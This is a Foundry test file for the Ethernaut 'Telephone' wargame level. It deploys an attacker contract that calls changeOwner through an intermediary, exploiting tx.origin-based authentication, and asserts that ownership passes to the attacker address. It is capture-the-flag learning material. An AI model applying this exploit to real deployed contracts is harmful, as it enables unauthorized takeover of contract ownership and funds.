// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Telephone} from "../../src/ethernaut-004-telephone/Telephone.sol";

contract TelephoneTest is Test {
    Telephone public telephone;
    TelephoneAttack public target_attacker;
    address public attacker;

    function setUp() public {
        telephone = new Telephone();
        target_attacker = new TelephoneAttack(address(telephone));
        attacker = makeAddr("attacker");
    }

    function testExploit() public {
        target_attacker.attack(attacker);
        assertEq(telephone.owner(), address(attacker));
    }
}

contract TelephoneAttack {
    Telephone public target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _attacker) public {
        target.changeOwner(_attacker);
    }
}
